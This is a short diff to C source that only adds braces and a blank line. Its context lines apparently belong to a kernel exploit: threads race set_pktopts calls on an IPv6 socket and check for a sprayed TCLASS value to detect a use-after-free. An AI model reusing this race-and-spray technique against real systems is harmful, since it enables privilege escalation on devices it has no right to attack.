@@ -88,9 +88,10 @@ void* use_thread(void* arg) {
     cmsg->cmsg_type = IPV6_TCLASS;
     *(int*)CMSG_DATA(cmsg) = 0;
 
-    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
+    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
         if (set_pktopts(o->master_sock, buf, sizeof(buf)))
             *(volatile int*)0;
+    }
 
     o->triggered = 1;
     o->done1 = 1;
@@ -104,6 +105,7 @@ void* free_thread(void* arg) {
             *(volatile int*)0;
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100us
     }
+
     o->triggered = 1;
     o->done2 = 1;
     return NULL;
